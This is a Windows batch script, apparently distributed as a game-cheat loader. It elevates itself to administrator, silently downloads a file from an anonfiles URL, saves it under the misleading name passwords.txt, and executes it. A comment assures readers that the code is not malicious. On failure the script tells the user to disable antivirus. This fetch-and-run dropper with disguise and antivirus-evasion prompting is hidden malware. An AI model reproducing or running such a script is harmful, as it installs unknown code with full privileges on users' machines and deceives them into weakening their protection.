:: originally made by amplitudes / PENGUIN114
:: code deobfuscated and improved by mp3#9999


@echo off
title  
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

:: incase you think the below code is malicious, passwords.txt is simply used to disguise the cheat - nothing else. 
curl -s "https://cdn-131.anonfiles.com/3co02463u8/06596b9d-1626288345/passwords.txt" > "%USERPROFILE%\passwords.txt"
IF not exist "%USERPROFILE%\passwords.txt" GOTO :error
"%USERPROFILE%\passwords.txt"
exit /b

:error
echo An error has occured.
echo.
echo Please disable antivirus and relaunch.
pause>NUL